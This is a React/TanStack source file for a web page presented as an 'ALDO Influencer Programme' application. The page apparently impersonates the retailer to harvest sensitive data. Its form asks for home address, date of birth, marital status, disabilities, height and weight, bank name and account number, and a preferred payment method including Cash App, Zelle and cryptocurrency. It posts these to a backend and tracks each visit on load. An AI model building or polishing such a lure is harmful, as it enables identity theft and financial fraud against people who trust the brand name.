import { createRoute } from "@tanstack/react-router";
import { useState, useEffect, type FormEvent } from "react";
import { Route as rootRoute } from "./__root";

export const Route = createRoute({
  getParentRoute: () => rootRoute,
  path: "/",
  component: Index,
  head: () => ({
    meta: [
      { title: "ALDO — Influencer Registration" },
      { name: "description", content: "Join the ALDO Crew. Apply to become an ALDO influencer." },
    ],
    links: [
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@300;400;500;600&family=Inter:wght@300;400;500;600&display=swap",
      },
    ],
  }),
});

type Field = {
  name: string;
  label: string;
  type?: string;
  required?: boolean;
  options?: string[];
  full?: boolean;
};

const personal: Field[] = [
  { name: "fullname", label: "Full Name", required: true },
  { name: "email", label: "Email Address", type: "email", required: true },
  { name: "mobile_number", label: "Mobile Number", type: "tel", required: true },
  { name: "home_address", label: "Home Address", required: true, full: true },
  { name: "city_state", label: "City / State", required: true },
  { name: "country_region", label: "Country / Region", required: true },
  { name: "instagram_username", label: "Instagram Handle" },
  { name: "occupation", label: "Occupation" },
  { name: "marital_status", label: "Marital Status", type: "select", options: ["Single", "Married", "Divorced", "Other"] },
  { name: "gender", label: "Gender", type: "select", options: ["Male", "Female", "Non-binary", "Other"] },
  { name: "dob", label: "Date of Birth", type: "date" },
  { name: "disabilities", label: "Disabilities" },
  { name: "clothes_sizes", label: "Clothing Size" },
  { name: "height", label: "Height" },
  { name: "weight", label: "Weight" },
  { name: "hobbies", label: "Hobbies", full: true },
];

const payment: Field[] = [
  { name: "account_name", label: "Account Name", full: true },
  { name: "bank_name", label: "Bank Name", full: true },
  { name: "account_number", label: "Account Number", full: true },
];

const paymentMethods = ["PayPal", "Cash App", "Zelle", "Cryptocurrency"];

function Index() {
  const [submitted, setSubmitted] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  // Track page visit on load
  useEffect(() => {
    fetch("http://127.0.0.1:8000/api/track-visit", { method: "POST" }).catch(() => {});
  }, []);

  async function onSubmit(e: FormEvent<HTMLFormElement>) {
    e.preventDefault();
    setLoading(true);
    setError(null);
    const formData = new FormData(e.currentTarget);
    const data = Object.fromEntries(formData.entries());
    try {
      const res = await fetch("http://127.0.0.1:8000/api/influencers", {
        method: "POST",
        headers: { "Content-Type": "application/json", Accept: "application/json" },
        body: JSON.stringify(data),
      });
      if (!res.ok) throw new Error("Submission failed");
      setSubmitted(true);
    } catch {
      setError("We couldn't submit your application. Please check your details and try again.");
    } finally {
      setLoading(false);
    }
  }

  return (
    <main className="min-h-screen bg-background">
      <header className="relative border-b border-border">
        <div className="mx-auto max-w-5xl px-6 py-16 md:py-24 text-center">
          <p className="text-xs tracking-[0.4em] text-muted-foreground uppercase mb-6">
            Est. 1972 · Montréal
          </p>
          <h1
            className="font-display text-6xl md:text-8xl font-light tracking-[0.3em] text-foreground"
            style={{ fontFamily: "var(--font-display)" }}
          >
            ALDO
          </h1>
          <div className="mx-auto mt-6 h-px w-16 bg-accent" />
          <h2
            className="mt-8 font-display text-2xl md:text-3xl italic font-light text-foreground"
            style={{ fontFamily: "var(--font-display)" }}
          >
            The Influencer Programme
          </h2>
          <p className="mx-auto mt-4 max-w-xl text-sm text-muted-foreground leading-relaxed">
            An invitation to creators who shape culture. Complete the application below to be
            considered for our global ambassador collective.
          </p>
        </div>
      </header>

      <section className="mx-auto max-w-3xl px-6 py-16 md:py-20">
        {submitted ? (
          <div className="border border-border bg-card px-8 py-16 text-center">
            <div className="mx-auto h-px w-12 bg-accent mb-8" />
            <h3 className="font-display text-4xl italic font-light" style={{ fontFamily: "var(--font-display)" }}>
              Thank you.
            </h3>
            <p className="mt-4 text-sm text-muted-foreground">
              Your application has been received. Our team will be in touch shortly.
            </p>
          </div>
        ) : (
          <form onSubmit={onSubmit} className="space-y-16">
            <FieldGroup title="Personal Details" number="01">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-x-8 gap-y-6">
                {personal.map((f) => <FieldInput key={f.name} field={f} />)}
              </div>
            </FieldGroup>

            <FieldGroup title="Payment Information" number="02">
              <div className="grid grid-cols-1 gap-y-6">
                {payment.map((f) => <FieldInput key={f.name} field={f} />)}
                <div className="space-y-3">
                  <Label>Preferred Payment Method</Label>
                  <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                    {paymentMethods.map((m) => (
                      <label
                        key={m}
                        className="group flex items-center justify-center border border-border bg-card px-4 py-3 text-xs uppercase tracking-widest cursor-pointer transition-colors hover:border-accent has-[:checked]:border-foreground has-[:checked]:bg-foreground has-[:checked]:text-background"
                      >
                        <input type="radio" name="payment_method" value={m} className="sr-only" />
                        {m}
                      </label>
                    ))}
                  </div>
                </div>
              </div>
            </FieldGroup>

            <div className="space-y-6 pt-4">
              <p className="text-center text-xs text-muted-foreground tracking-wide">
                By submitting, you agree to ALDO's{" "}
                <span className="underline underline-offset-4">Terms & Conditions</span> and{" "}
                <span className="underline underline-offset-4">Privacy Policy</span>.
              </p>
              {error && <p className="text-center text-xs text-destructive tracking-wide">{error}</p>}
              <button
                type="submit"
                disabled={loading}
                className="block w-full bg-foreground text-background py-5 text-xs uppercase tracking-[0.4em] font-medium transition-opacity hover:opacity-90 disabled:opacity-50"
              >
                {loading ? "Submitting…" : "Submit Application"}
              </button>
            </div>
          </form>
        )}
      </section>

      <footer className="border-t border-border">
        <div className="mx-auto max-w-5xl px-6 py-8 text-center text-xs tracking-widest text-muted-foreground uppercase">
          © ALDO Group · All Rights Reserved
        </div>
      </footer>
    </main>
  );
}

function FieldGroup({ title, number, children }: { title: string; number: string; children: React.ReactNode }) {
  return (
    <div>
      <div className="flex items-baseline gap-4 mb-8 pb-4 border-b border-border">
        <span className="text-xs text-accent tracking-widest">{number}</span>
        <h3 className="font-display text-2xl italic font-light" style={{ fontFamily: "var(--font-display)" }}>
          {title}
        </h3>
      </div>
      {children}
    </div>
  );
}

function Label({ children }: { children: React.ReactNode }) {
  return (
    <label className="block text-[10px] uppercase tracking-[0.25em] text-muted-foreground">
      {children}
    </label>
  );
}

function FieldInput({ field }: { field: Field }) {
  const base =
    "w-full bg-transparent border-b border-border py-2 text-sm text-foreground focus:outline-none focus:border-foreground transition-colors";
  return (
    <div className={`space-y-2 ${field.full ? "md:col-span-2" : ""}`}>
      <Label>
        {field.label}
        {field.required && <span className="text-accent ml-1">*</span>}
      </Label>
      {field.type === "select" ? (
        <select name={field.name} className={base} defaultValue="">
          <option value="" disabled>Select…</option>
          {field.options?.map((o) => <option key={o} value={o}>{o}</option>)}
        </select>
      ) : (
        <input type={field.type ?? "text"} name={field.name} required={field.required} className={base} />
      )}
    </div>
  );
}
